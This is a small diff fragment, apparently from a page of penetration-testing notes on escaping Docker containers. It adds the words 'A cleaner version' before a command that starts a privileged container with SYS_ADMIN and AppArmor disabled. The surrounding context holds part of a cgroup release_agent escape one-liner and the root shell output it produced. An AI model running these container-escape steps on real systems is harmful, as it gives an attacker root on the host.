@@ -152,6 +152,7 @@ chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 3587899 ?        00:00:00 loop8
 root@945bd992020b:/#
 ```
+A cleaner version 
 ```
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
